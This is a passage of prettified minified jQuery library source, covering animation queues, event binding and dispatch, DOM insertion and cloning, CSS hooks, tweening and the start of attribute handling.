      dequeue: function (e, t) {
        t = t || "fx";
        var n = ee.queue(e, t),
          i = n.length,
          o = n.shift(),
          r = ee._queueHooks(e, t);
        "inprogress" === o && ((o = n.shift()), i--),
          o &&
            ("fx" === t && n.unshift("inprogress"),
            delete r.stop,
            o.call(
              e,
              function () {
                ee.dequeue(e, t);
              },
              r
            )),
          !i && r && r.empty.fire();
      },
      _queueHooks: function (e, t) {
        var n = t + "queueHooks";
        return (
          we.get(e, n) ||
          we.access(e, n, {
            empty: ee.Callbacks("once memory").add(function () {
              we.remove(e, [t + "queue", n]);
            }),
          })
        );
      },
    }),
    ee.fn.extend({
      queue: function (e, t) {
        var n = 2;
        return (
          "string" != typeof e && ((t = e), (e = "fx"), n--),
          arguments.length < n
            ? ee.queue(this[0], e)
            : void 0 === t
            ? this
            : this.each(function () {
                var n = ee.queue(this, e, t);
                ee._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && ee.dequeue(this, e);
              })
        );
      },
      dequeue: function (e) {
        return this.each(function () {
          ee.dequeue(this, e);
        });
      },
      clearQueue: function (e) {
        return this.queue(e || "fx", []);
      },
      promise: function (e, t) {
        var n,
          i = 1,
          o = ee.Deferred(),
          r = this,
          s = this.length,
          a = function () {
            --i || o.resolveWith(r, [r]);
          };
        for ("string" != typeof e && ((t = e), (e = void 0)), e = e || "fx"; s--; ) (n = we.get(r[s], e + "queueHooks")) && n.empty && (i++, n.empty.add(a));
        return a(), o.promise(t);
      },
    });
  var Ce = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
    ke = new RegExp("^(?:([+-])=|)(" + Ce + ")([a-z%]*)$", "i"),
    Se = ["Top", "Right", "Bottom", "Left"],
    xe = function (e, t) {
      return (e = t || e), "none" === ee.css(e, "display") || !ee.contains(e.ownerDocument, e);
    },
    Ee = /^(?:checkbox|radio)$/i,
    Ae = /<([\w:-]+)/,
    De = /^$|\/(?:java|ecma)script/i,
    Ne = {
      option: [1, "<select multiple='multiple'>", "</select>"],
      thead: [1, "<table>", "</table>"],
      col: [2, "<table><colgroup>", "</colgroup></table>"],
      tr: [2, "<table><tbody>", "</tbody></table>"],
      td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
      _default: [0, "", ""],
    };
  (Ne.optgroup = Ne.option), (Ne.tbody = Ne.tfoot = Ne.colgroup = Ne.caption = Ne.thead), (Ne.th = Ne.td);
  var Ie = /<|&#?\w+;/;
  !(function () {
    var e = B.createDocumentFragment().appendChild(B.createElement("div")),
      t = B.createElement("input");
    t.setAttribute("type", "radio"),
      t.setAttribute("checked", "checked"),
      t.setAttribute("name", "t"),
      e.appendChild(t),
      (J.checkClone = e.cloneNode(!0).cloneNode(!0).lastChild.checked),
      (e.innerHTML = "<textarea>x</textarea>"),
      (J.noCloneChecked = !!e.cloneNode(!0).lastChild.defaultValue);
  })();
  var $e = /^key/,
    Oe = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
    je = /^([^.]*)(?:\.(.+)|)/;
  (ee.event = {
    global: {},
    add: function (e, t, n, i, o) {
      var r,
        s,
        a,
        l,
        c,
        u,
        d,
        p,
        f,
        h,
        g,
        m = we.get(e);
      if (m)
        for (
          n.handler && ((n = (r = n).handler), (o = r.selector)),
            n.guid || (n.guid = ee.guid++),
            (l = m.events) || (l = m.events = {}),
            (s = m.handle) ||
              (s = m.handle = function (t) {
                return void 0 !== ee && ee.event.triggered !== t.type ? ee.event.dispatch.apply(e, arguments) : void 0;
              }),
            c = (t = (t || "").match(me) || [""]).length;
          c--;

        )
          (f = g = (a = je.exec(t[c]) || [])[1]),
            (h = (a[2] || "").split(".").sort()),
            f &&
              ((d = ee.event.special[f] || {}),
              (f = (o ? d.delegateType : d.bindType) || f),
              (d = ee.event.special[f] || {}),
              (u = ee.extend({ type: f, origType: g, data: i, handler: n, guid: n.guid, selector: o, needsContext: o && ee.expr.match.needsContext.test(o), namespace: h.join(".") }, r)),
              (p = l[f]) || (((p = l[f] = []).delegateCount = 0), (d.setup && !1 !== d.setup.call(e, i, h, s)) || (e.addEventListener && e.addEventListener(f, s))),
              d.add && (d.add.call(e, u), u.handler.guid || (u.handler.guid = n.guid)),
              o ? p.splice(p.delegateCount++, 0, u) : p.push(u),
              (ee.event.global[f] = !0));
    },
    remove: function (e, t, n, i, o) {
      var r,
        s,
        a,
        l,
        c,
        u,
        d,
        p,
        f,
        h,
        g,
        m = we.hasData(e) && we.get(e);
      if (m && (l = m.events)) {
        for (c = (t = (t || "").match(me) || [""]).length; c--; )
          if (((f = g = (a = je.exec(t[c]) || [])[1]), (h = (a[2] || "").split(".").sort()), f)) {
            for (d = ee.event.special[f] || {}, p = l[(f = (i ? d.delegateType : d.bindType) || f)] || [], a = a[2] && new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), s = r = p.length; r--; )
              (u = p[r]),
                (!o && g !== u.origType) ||
                  (n && n.guid !== u.guid) ||
                  (a && !a.test(u.namespace)) ||
                  (i && i !== u.selector && ("**" !== i || !u.selector)) ||
                  (p.splice(r, 1), u.selector && p.delegateCount--, d.remove && d.remove.call(e, u));
            s && !p.length && ((d.teardown && !1 !== d.teardown.call(e, h, m.handle)) || ee.removeEvent(e, f, m.handle), delete l[f]);
          } else for (f in l) ee.event.remove(e, f + t[c], n, i, !0);
        ee.isEmptyObject(l) && we.remove(e, "handle events");
      }
    },
    dispatch: function (e) {
      e = ee.event.fix(e);
      var t,
        n,
        i,
        o,
        r,
        s = [],
        a = U.call(arguments),
        l = (we.get(this, "events") || {})[e.type] || [],
        c = ee.event.special[e.type] || {};
      if (((a[0] = e), (e.delegateTarget = this), !c.preDispatch || !1 !== c.preDispatch.call(this, e))) {
        for (s = ee.event.handlers.call(this, e, l), t = 0; (o = s[t++]) && !e.isPropagationStopped(); )
          for (e.currentTarget = o.elem, n = 0; (r = o.handlers[n++]) && !e.isImmediatePropagationStopped(); )
            (!e.rnamespace || e.rnamespace.test(r.namespace)) &&
              ((e.handleObj = r), (e.data = r.data), void 0 !== (i = ((ee.event.special[r.origType] || {}).handle || r.handler).apply(o.elem, a)) && !1 === (e.result = i) && (e.preventDefault(), e.stopPropagation()));
        return c.postDispatch && c.postDispatch.call(this, e), e.result;
      }
    },
    handlers: function (e, t) {
      var n,
        i,
        o,
        r,
        s = [],
        a = t.delegateCount,
        l = e.target;
      if (a && l.nodeType && ("click" !== e.type || isNaN(e.button) || e.button < 1))
        for (; l !== this; l = l.parentNode || this)
          if (1 === l.nodeType && (!0 !== l.disabled || "click" !== e.type)) {
            for (i = [], n = 0; a > n; n++) void 0 === i[(o = (r = t[n]).selector + " ")] && (i[o] = r.needsContext ? ee(o, this).index(l) > -1 : ee.find(o, this, null, [l]).length), i[o] && i.push(r);
            i.length && s.push({ elem: l, handlers: i });
          }
      return a < t.length && s.push({ elem: this, handlers: t.slice(a) }), s;
    },
    props: "altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
    fixHooks: {},
    keyHooks: {
      props: "char charCode key keyCode".split(" "),
      filter: function (e, t) {
        return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode), e;
      },
    },
    mouseHooks: {
      props: "button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
      filter: function (e, t) {
        var n,
          i,
          o,
          r = t.button;
        return (
          null == e.pageX &&
            null != t.clientX &&
            ((i = (n = e.target.ownerDocument || B).documentElement),
            (o = n.body),
            (e.pageX = t.clientX + ((i && i.scrollLeft) || (o && o.scrollLeft) || 0) - ((i && i.clientLeft) || (o && o.clientLeft) || 0)),
            (e.pageY = t.clientY + ((i && i.scrollTop) || (o && o.scrollTop) || 0) - ((i && i.clientTop) || (o && o.clientTop) || 0))),
          e.which || void 0 === r || (e.which = 1 & r ? 1 : 2 & r ? 3 : 4 & r ? 2 : 0),
          e
        );
      },
    },
    fix: function (e) {
      if (e[ee.expando]) return e;
      var t,
        n,
        i,
        o = e.type,
        r = e,
        s = this.fixHooks[o];
      for (s || (this.fixHooks[o] = s = Oe.test(o) ? this.mouseHooks : $e.test(o) ? this.keyHooks : {}), i = s.props ? this.props.concat(s.props) : this.props, e = new ee.Event(r), t = i.length; t--; ) e[(n = i[t])] = r[n];
      return e.target || (e.target = B), 3 === e.target.nodeType && (e.target = e.target.parentNode), s.filter ? s.filter(e, r) : e;
    },
    special: {
      load: { noBubble: !0 },
      focus: {
        trigger: function () {
          return this !== h() && this.focus ? (this.focus(), !1) : void 0;
        },
        delegateType: "focusin",
      },
      blur: {
        trigger: function () {
          return this === h() && this.blur ? (this.blur(), !1) : void 0;
        },
        delegateType: "focusout",
      },
      click: {
        trigger: function () {
          return "checkbox" === this.type && this.click && ee.nodeName(this, "input") ? (this.click(), !1) : void 0;
        },
        _default: function (e) {
          return ee.nodeName(e.target, "a");
        },
      },
      beforeunload: {
        postDispatch: function (e) {
          void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result);
        },
      },
    },
  }),
    (ee.removeEvent = function (e, t, n) {
      e.removeEventListener && e.removeEventListener(t, n);
    }),
    (ee.Event = function (e, t) {
      return this instanceof ee.Event
        ? (e && e.type ? ((this.originalEvent = e), (this.type = e.type), (this.isDefaultPrevented = e.defaultPrevented || (void 0 === e.defaultPrevented && !1 === e.returnValue) ? p : f)) : (this.type = e),
          t && ee.extend(this, t),
          (this.timeStamp = (e && e.timeStamp) || ee.now()),
          void (this[ee.expando] = !0))
        : new ee.Event(e, t);
    }),
    (ee.Event.prototype = {
      constructor: ee.Event,
      isDefaultPrevented: f,
      isPropagationStopped: f,
      isImmediatePropagationStopped: f,
      preventDefault: function () {
        var e = this.originalEvent;
        (this.isDefaultPrevented = p), e && e.preventDefault();
      },
      stopPropagation: function () {
        var e = this.originalEvent;
        (this.isPropagationStopped = p), e && e.stopPropagation();
      },
      stopImmediatePropagation: function () {
        var e = this.originalEvent;
        (this.isImmediatePropagationStopped = p), e && e.stopImmediatePropagation(), this.stopPropagation();
      },
    }),
    ee.each({ mouseenter: "mouseover", mouseleave: "mouseout", pointerenter: "pointerover", pointerleave: "pointerout" }, function (e, t) {
      ee.event.special[e] = {
        delegateType: t,
        bindType: t,
        handle: function (e) {
          var n,
            i = this,
            o = e.relatedTarget,
            r = e.handleObj;
          return (!o || (o !== i && !ee.contains(i, o))) && ((e.type = r.origType), (n = r.handler.apply(this, arguments)), (e.type = t)), n;
        },
      };
    }),
    ee.fn.extend({
      on: function (e, t, n, i) {
        return g(this, e, t, n, i);
      },
      one: function (e, t, n, i) {
        return g(this, e, t, n, i, 1);
      },
      off: function (e, t, n) {
        var i, o;
        if (e && e.preventDefault && e.handleObj) return (i = e.handleObj), ee(e.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this;
        if ("object" == typeof e) {
          for (o in e) this.off(o, t, e[o]);
          return this;
        }
        return (
          (!1 === t || "function" == typeof t) && ((n = t), (t = void 0)),
          !1 === n && (n = f),
          this.each(function () {
            ee.event.remove(this, e, n, t);
          })
        );
      },
    });
  var He = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,
    Pe = /<script|<style|<link/i,
    Le = /checked\s*(?:[^=]|=\s*.checked.)/i,
    Me = /^true\/(.*)/,
    Re = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
  ee.extend({
    htmlPrefilter: function (e) {
      return e.replace(He, "<$1></$2>");
    },
    clone: function (e, t, n) {
      var i,
        o,
        r,
        s,
        a = e.cloneNode(!0),
        l = ee.contains(e.ownerDocument, e);
      if (!(J.noCloneChecked || (1 !== e.nodeType && 11 !== e.nodeType) || ee.isXMLDoc(e))) for (s = c(a), i = 0, o = (r = c(e)).length; o > i; i++) b(r[i], s[i]);
      if (t)
        if (n) for (r = r || c(e), s = s || c(a), i = 0, o = r.length; o > i; i++) w(r[i], s[i]);
        else w(e, a);
      return (s = c(a, "script")).length > 0 && u(s, !l && c(e, "script")), a;
    },
    cleanData: function (e) {
      for (var t, n, i, o = ee.event.special, r = 0; void 0 !== (n = e[r]); r++)
        if (ye(n)) {
          if ((t = n[we.expando])) {
            if (t.events) for (i in t.events) o[i] ? ee.event.remove(n, i) : ee.removeEvent(n, i, t.handle);
            n[we.expando] = void 0;
          }
          n[be.expando] && (n[be.expando] = void 0);
        }
    },
  }),
    ee.fn.extend({
      domManip: T,
      detach: function (e) {
        return _(this, e, !0);
      },
      remove: function (e) {
        return _(this, e);
      },
      text: function (e) {
        return ve(
          this,
          function (e) {
            return void 0 === e
              ? ee.text(this)
              : this.empty().each(function () {
                  (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) && (this.textContent = e);
                });
          },
          null,
          e,
          arguments.length
        );
      },
      append: function () {
        return T(this, arguments, function (e) {
          (1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType) || m(this, e).appendChild(e);
        });
      },
      prepend: function () {
        return T(this, arguments, function (e) {
          if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
            var t = m(this, e);
            t.insertBefore(e, t.firstChild);
          }
        });
      },
      before: function () {
        return T(this, arguments, function (e) {
          this.parentNode && this.parentNode.insertBefore(e, this);
        });
      },
      after: function () {
        return T(this, arguments, function (e) {
          this.parentNode && this.parentNode.insertBefore(e, this.nextSibling);
        });
      },
      empty: function () {
        for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (ee.cleanData(c(e, !1)), (e.textContent = ""));
        return this;
      },
      clone: function (e, t) {
        return (
          (e = null != e && e),
          (t = null == t ? e : t),
          this.map(function () {
            return ee.clone(this, e, t);
          })
        );
      },
      html: function (e) {
        return ve(
          this,
          function (e) {
            var t = this[0] || {},
              n = 0,
              i = this.length;
            if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
            if ("string" == typeof e && !Pe.test(e) && !Ne[(Ae.exec(e) || ["", ""])[1].toLowerCase()]) {
              e = ee.htmlPrefilter(e);
              try {
                for (; i > n; n++) 1 === (t = this[n] || {}).nodeType && (ee.cleanData(c(t, !1)), (t.innerHTML = e));
                t = 0;
              } catch (e) {}
            }
            t && this.empty().append(e);
          },
          null,
          e,
          arguments.length
        );
      },
      replaceWith: function () {
        var e = [];
        return T(
          this,
          arguments,
          function (t) {
            var n = this.parentNode;
            ee.inArray(this, e) < 0 && (ee.cleanData(c(this)), n && n.replaceChild(t, this));
          },
          e
        );
      },
    }),
    ee.each({ appendTo: "append", prependTo: "prepend", insertBefore: "before", insertAfter: "after", replaceAll: "replaceWith" }, function (e, t) {
      ee.fn[e] = function (e) {
        for (var n, i = [], o = ee(e), r = o.length - 1, s = 0; r >= s; s++) (n = s === r ? this : this.clone(!0)), ee(o[s])[t](n), Q.apply(i, n.get());
        return this.pushStack(i);
      };
    });
  var qe,
    We = { HTML: "block", BODY: "block" },
    Fe = /^margin/,
    ze = new RegExp("^(" + Ce + ")(?!px)[a-z%]+$", "i"),
    Be = function (t) {
      var n = t.ownerDocument.defaultView;
      return (n && n.opener) || (n = e), n.getComputedStyle(t);
    },
    Ue = function (e, t, n, i) {
      var o,
        r,
        s = {};
      for (r in t) (s[r] = e.style[r]), (e.style[r] = t[r]);
      for (r in ((o = n.apply(e, i || [])), t)) e.style[r] = s[r];
      return o;
    },
    Ke = B.documentElement;
  !(function () {
    function t() {
      (a.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%"), (a.innerHTML = ""), Ke.appendChild(s);
      var t = e.getComputedStyle(a);
      (n = "1%" !== t.top), (r = "2px" === t.marginLeft), (i = "4px" === t.width), (a.style.marginRight = "50%"), (o = "4px" === t.marginRight), Ke.removeChild(s);
    }
    var n,
      i,
      o,
      r,
      s = B.createElement("div"),
      a = B.createElement("div");
    a.style &&
      ((a.style.backgroundClip = "content-box"),
      (a.cloneNode(!0).style.backgroundClip = ""),
      (J.clearCloneStyle = "content-box" === a.style.backgroundClip),
      (s.style.cssText = "border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute"),
      s.appendChild(a),
      ee.extend(J, {
        pixelPosition: function () {
          return t(), n;
        },
        boxSizingReliable: function () {
          return null == i && t(), i;
        },
        pixelMarginRight: function () {
          return null == i && t(), o;
        },
        reliableMarginLeft: function () {
          return null == i && t(), r;
        },
        reliableMarginRight: function () {
          var t,
            n = a.appendChild(B.createElement("div"));
          return (
            (n.style.cssText = a.style.cssText = "-webkit-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0"),
            (n.style.marginRight = n.style.width = "0"),
            (a.style.width = "1px"),
            Ke.appendChild(s),
            (t = !parseFloat(e.getComputedStyle(n).marginRight)),
            Ke.removeChild(s),
            a.removeChild(n),
            t
          );
        },
      }));
  })();
  var Qe = /^(none|table(?!-c[ea]).+)/,
    Ye = { position: "absolute", visibility: "hidden", display: "block" },
    Xe = { letterSpacing: "0", fontWeight: "400" },
    Ve = ["Webkit", "O", "Moz", "ms"],
    Ge = B.createElement("div").style;
  ee.extend({
    cssHooks: {
      opacity: {
        get: function (e, t) {
          if (t) {
            var n = S(e, "opacity");
            return "" === n ? "1" : n;
          }
        },
      },
    },
    cssNumber: { animationIterationCount: !0, columnCount: !0, fillOpacity: !0, flexGrow: !0, flexShrink: !0, fontWeight: !0, lineHeight: !0, opacity: !0, order: !0, orphans: !0, widows: !0, zIndex: !0, zoom: !0 },
    cssProps: { float: "cssFloat" },
    style: function (e, t, n, i) {
      if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
        var o,
          r,
          s,
          a = ee.camelCase(t),
          c = e.style;
        return (
          (t = ee.cssProps[a] || (ee.cssProps[a] = E(a) || a)),
          (s = ee.cssHooks[t] || ee.cssHooks[a]),
          void 0 === n
            ? s && "get" in s && void 0 !== (o = s.get(e, !1, i))
              ? o
              : c[t]
            : ("string" === (r = typeof n) && (o = ke.exec(n)) && o[1] && ((n = l(e, t, o)), (r = "number")),
              void (
                null != n &&
                n == n &&
                ("number" === r && (n += (o && o[3]) || (ee.cssNumber[a] ? "" : "px")),
                J.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (c[t] = "inherit"),
                (s && "set" in s && void 0 === (n = s.set(e, n, i))) || (c[t] = n))
              ))
        );
      }
    },
    css: function (e, t, n, i) {
      var o,
        r,
        s,
        a = ee.camelCase(t);
      return (
        (t = ee.cssProps[a] || (ee.cssProps[a] = E(a) || a)),
        (s = ee.cssHooks[t] || ee.cssHooks[a]) && "get" in s && (o = s.get(e, !0, n)),
        void 0 === o && (o = S(e, t, i)),
        "normal" === o && t in Xe && (o = Xe[t]),
        "" === n || n ? ((r = parseFloat(o)), !0 === n || isFinite(r) ? r || 0 : o) : o
      );
    },
  }),
    ee.each(["height", "width"], function (e, t) {
      ee.cssHooks[t] = {
        get: function (e, n, i) {
          return n
            ? Qe.test(ee.css(e, "display")) && 0 === e.offsetWidth
              ? Ue(e, Ye, function () {
                  return N(e, t, i);
                })
              : N(e, t, i)
            : void 0;
        },
        set: function (e, n, i) {
          var o,
            r = i && Be(e),
            s = i && D(e, t, i, "border-box" === ee.css(e, "boxSizing", !1, r), r);
          return s && (o = ke.exec(n)) && "px" !== (o[3] || "px") && ((e.style[t] = n), (n = ee.css(e, t))), A(0, n, s);
        },
      };
    }),
    (ee.cssHooks.marginLeft = x(J.reliableMarginLeft, function (e, t) {
      return t
        ? (parseFloat(S(e, "marginLeft")) ||
            e.getBoundingClientRect().left -
              Ue(e, { marginLeft: 0 }, function () {
                return e.getBoundingClientRect().left;
              })) + "px"
        : void 0;
    })),
    (ee.cssHooks.marginRight = x(J.reliableMarginRight, function (e, t) {
      return t ? Ue(e, { display: "inline-block" }, S, [e, "marginRight"]) : void 0;
    })),
    ee.each({ margin: "", padding: "", border: "Width" }, function (e, t) {
      (ee.cssHooks[e + t] = {
        expand: function (n) {
          for (var i = 0, o = {}, r = "string" == typeof n ? n.split(" ") : [n]; 4 > i; i++) o[e + Se[i] + t] = r[i] || r[i - 2] || r[0];
          return o;
        },
      }),
        Fe.test(e) || (ee.cssHooks[e + t].set = A);
    }),
    ee.fn.extend({
      css: function (e, t) {
        return ve(
          this,
          function (e, t, n) {
            var i,
              o,
              r = {},
              s = 0;
            if (ee.isArray(t)) {
              for (i = Be(e), o = t.length; o > s; s++) r[t[s]] = ee.css(e, t[s], !1, i);
              return r;
            }
            return void 0 !== n ? ee.style(e, t, n) : ee.css(e, t);
          },
          e,
          t,
          arguments.length > 1
        );
      },
      show: function () {
        return I(this, !0);
      },
      hide: function () {
        return I(this);
      },
      toggle: function (e) {
        return "boolean" == typeof e
          ? e
            ? this.show()
            : this.hide()
          : this.each(function () {
              xe(this) ? ee(this).show() : ee(this).hide();
            });
      },
    }),
    (ee.Tween = $),
    ($.prototype = {
      constructor: $,
      init: function (e, t, n, i, o, r) {
        (this.elem = e), (this.prop = n), (this.easing = o || ee.easing._default), (this.options = t), (this.start = this.now = this.cur()), (this.end = i), (this.unit = r || (ee.cssNumber[n] ? "" : "px"));
      },
      cur: function () {
        var e = $.propHooks[this.prop];
        return e && e.get ? e.get(this) : $.propHooks._default.get(this);
      },
      run: function (e) {
        var t,
          n = $.propHooks[this.prop];
        return (
          this.options.duration ? (this.pos = t = ee.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration)) : (this.pos = t = e),
          (this.now = (this.end - this.start) * t + this.start),
          this.options.step && this.options.step.call(this.elem, this.now, this),
          n && n.set ? n.set(this) : $.propHooks._default.set(this),
          this
        );
      },
    }),
    ($.prototype.init.prototype = $.prototype),
    ($.propHooks = {
      _default: {
        get: function (e) {
          var t;
          return 1 !== e.elem.nodeType || (null != e.elem[e.prop] && null == e.elem.style[e.prop]) ? e.elem[e.prop] : (t = ee.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0;
        },
        set: function (e) {
          ee.fx.step[e.prop] ? ee.fx.step[e.prop](e) : 1 !== e.elem.nodeType || (null == e.elem.style[ee.cssProps[e.prop]] && !ee.cssHooks[e.prop]) ? (e.elem[e.prop] = e.now) : ee.style(e.elem, e.prop, e.now + e.unit);
        },
      },
    }),
    ($.propHooks.scrollTop = $.propHooks.scrollLeft = {
      set: function (e) {
        e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now);
      },
    }),
    (ee.easing = {
      linear: function (e) {
        return e;
      },
      swing: function (e) {
        return 0.5 - Math.cos(e * Math.PI) / 2;
      },
      _default: "swing",
    }),
    (ee.fx = $.prototype.init),
    (ee.fx.step = {});
  var Je,
    Ze,
    et = /^(?:toggle|show|hide)$/,
    tt = /queueHooks$/;
  (ee.Animation = ee.extend(P, {
    tweeners: {
      "*": [
        function (e, t) {
          var n = this.createTween(e, t);
          return l(n.elem, e, ke.exec(t), n), n;
        },
      ],
    },
    tweener: function (e, t) {
      ee.isFunction(e) ? ((t = e), (e = ["*"])) : (e = e.match(me));
      for (var n, i = 0, o = e.length; o > i; i++) (n = e[i]), (P.tweeners[n] = P.tweeners[n] || []), P.tweeners[n].unshift(t);
    },
    prefilters: [
      function (e, t, n) {
        var i,
          o,
          r,
          s,
          a,
          l,
          c,
          u = this,
          d = {},
          p = e.style,
          f = e.nodeType && xe(e),
          h = we.get(e, "fxshow");
        for (i in (n.queue ||
          (null == (a = ee._queueHooks(e, "fx")).unqueued &&
            ((a.unqueued = 0),
            (l = a.empty.fire),
            (a.empty.fire = function () {
              a.unqueued || l();
            })),
          a.unqueued++,
          u.always(function () {
            u.always(function () {
              a.unqueued--, ee.queue(e, "fx").length || a.empty.fire();
            });
          })),
        1 === e.nodeType &&
          ("height" in t || "width" in t) &&
          ((n.overflow = [p.overflow, p.overflowX, p.overflowY]), "inline" === ("none" === (c = ee.css(e, "display")) ? we.get(e, "olddisplay") || k(e.nodeName) : c) && "none" === ee.css(e, "float") && (p.display = "inline-block")),
        n.overflow &&
          ((p.overflow = "hidden"),
          u.always(function () {
            (p.overflow = n.overflow[0]), (p.overflowX = n.overflow[1]), (p.overflowY = n.overflow[2]);
          })),
        t))
          if (((o = t[i]), et.exec(o))) {
            if ((delete t[i], (r = r || "toggle" === o), o === (f ? "hide" : "show"))) {
              if ("show" !== o || !h || void 0 === h[i]) continue;
              f = !0;
            }
            d[i] = (h && h[i]) || ee.style(e, i);
          } else c = void 0;
        if (ee.isEmptyObject(d)) "inline" === ("none" === c ? k(e.nodeName) : c) && (p.display = c);
        else
          for (i in (h ? "hidden" in h && (f = h.hidden) : (h = we.access(e, "fxshow", {})),
          r && (h.hidden = !f),
          f
            ? ee(e).show()
            : u.done(function () {
                ee(e).hide();
              }),
          u.done(function () {
            var t;
            for (t in (we.remove(e, "fxshow"), d)) ee.style(e, t, d[t]);
          }),
          d))
            (s = H(f ? h[i] : 0, i, u)), i in h || ((h[i] = s.start), f && ((s.end = s.start), (s.start = "width" === i || "height" === i ? 1 : 0)));
      },
    ],
    prefilter: function (e, t) {
      t ? P.prefilters.unshift(e) : P.prefilters.push(e);
    },
  })),
    (ee.speed = function (e, t, n) {
      var i = e && "object" == typeof e ? ee.extend({}, e) : { complete: n || (!n && t) || (ee.isFunction(e) && e), duration: e, easing: (n && t) || (t && !ee.isFunction(t) && t) };
      return (
        (i.duration = ee.fx.off ? 0 : "number" == typeof i.duration ? i.duration : i.duration in ee.fx.speeds ? ee.fx.speeds[i.duration] : ee.fx.speeds._default),
        (null == i.queue || !0 === i.queue) && (i.queue = "fx"),
        (i.old = i.complete),
        (i.complete = function () {
          ee.isFunction(i.old) && i.old.call(this), i.queue && ee.dequeue(this, i.queue);
        }),
        i
      );
    }),
    ee.fn.extend({
      fadeTo: function (e, t, n, i) {
        return this.filter(xe).css("opacity", 0).show().end().animate({ opacity: t }, e, n, i);
      },
      animate: function (e, t, n, i) {
        var o = ee.isEmptyObject(e),
          r = ee.speed(t, n, i),
          s = function () {
            var t = P(this, ee.extend({}, e), r);
            (o || we.get(this, "finish")) && t.stop(!0);
          };
        return (s.finish = s), o || !1 === r.queue ? this.each(s) : this.queue(r.queue, s);
      },
      stop: function (e, t, n) {
        var i = function (e) {
          var t = e.stop;
          delete e.stop, t(n);
        };
        return (
          "string" != typeof e && ((n = t), (t = e), (e = void 0)),
          t && !1 !== e && this.queue(e || "fx", []),
          this.each(function () {
            var t = !0,
              o = null != e && e + "queueHooks",
              r = ee.timers,
              s = we.get(this);
            if (o) s[o] && s[o].stop && i(s[o]);
            else for (o in s) s[o] && s[o].stop && tt.test(o) && i(s[o]);
            for (o = r.length; o--; ) r[o].elem !== this || (null != e && r[o].queue !== e) || (r[o].anim.stop(n), (t = !1), r.splice(o, 1));
            (t || !n) && ee.dequeue(this, e);
          })
        );
      },
      finish: function (e) {
        return (
          !1 !== e && (e = e || "fx"),
          this.each(function () {
            var t,
              n = we.get(this),
              i = n[e + "queue"],
              o = n[e + "queueHooks"],
              r = ee.timers,
              s = i ? i.length : 0;
            for (n.finish = !0, ee.queue(this, e, []), o && o.stop && o.stop.call(this, !0), t = r.length; t--; ) r[t].elem === this && r[t].queue === e && (r[t].anim.stop(!0), r.splice(t, 1));
            for (t = 0; s > t; t++) i[t] && i[t].finish && i[t].finish.call(this);
            delete n.finish;
          })
        );
      },
    }),
    ee.each(["toggle", "show", "hide"], function (e, t) {
      var n = ee.fn[t];
      ee.fn[t] = function (e, i, o) {
        return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(j(t, !0), e, i, o);
      };
    }),
    ee.each({ slideDown: j("show"), slideUp: j("hide"), slideToggle: j("toggle"), fadeIn: { opacity: "show" }, fadeOut: { opacity: "hide" }, fadeToggle: { opacity: "toggle" } }, function (e, t) {
      ee.fn[e] = function (e, n, i) {
        return this.animate(t, e, n, i);
      };
    }),
    (ee.timers = []),
    (ee.fx.tick = function () {
      var e,
        t = 0,
        n = ee.timers;
      for (Je = ee.now(); t < n.length; t++) (e = n[t])() || n[t] !== e || n.splice(t--, 1);
      n.length || ee.fx.stop(), (Je = void 0);
    }),
    (ee.fx.timer = function (e) {
      ee.timers.push(e), e() ? ee.fx.start() : ee.timers.pop();
    }),
    (ee.fx.interval = 13),
    (ee.fx.start = function () {
      Ze || (Ze = e.setInterval(ee.fx.tick, ee.fx.interval));
    }),
    (ee.fx.stop = function () {
      e.clearInterval(Ze), (Ze = null);
    }),
    (ee.fx.speeds = { slow: 600, fast: 200, _default: 400 }),
    (ee.fn.delay = function (t, n) {
      return (
        (t = (ee.fx && ee.fx.speeds[t]) || t),
        (n = n || "fx"),
        this.queue(n, function (n, i) {
          var o = e.setTimeout(n, t);
          i.stop = function () {
            e.clearTimeout(o);
          };
        })
      );
    }),
    (function () {
      var e = B.createElement("input"),
        t = B.createElement("select"),
        n = t.appendChild(B.createElement("option"));
      (e.type = "checkbox"), (J.checkOn = "" !== e.value), (J.optSelected = n.selected), (t.disabled = !0), (J.optDisabled = !n.disabled), ((e = B.createElement("input")).value = "t"), (e.type = "radio"), (J.radioValue = "t" === e.value);
    })();
  var nt,
    it = ee.expr.attrHandle;
  ee.fn.extend({
    attr: function (e, t) {
      return ve(this, ee.attr, e, t, arguments.length > 1);
    },
    removeAttr: function (e) {
      return this.each(function () {
        ee.removeAttr(this, e);
      });
    },
  }),
    ee.extend({
      attr: function (e, t, n) {
        var i,
          o,
          r = e.nodeType;
        if (3 !== r && 8 !== r && 2 !== r)
          return void 0 === e.getAttribute
            ? ee.prop(e, t, n)
            : ((1 === r && ee.isXMLDoc(e)) || ((t = t.toLowerCase()), (o = ee.attrHooks[t] || (ee.expr.match.bool.test(t) ? nt : void 0))),
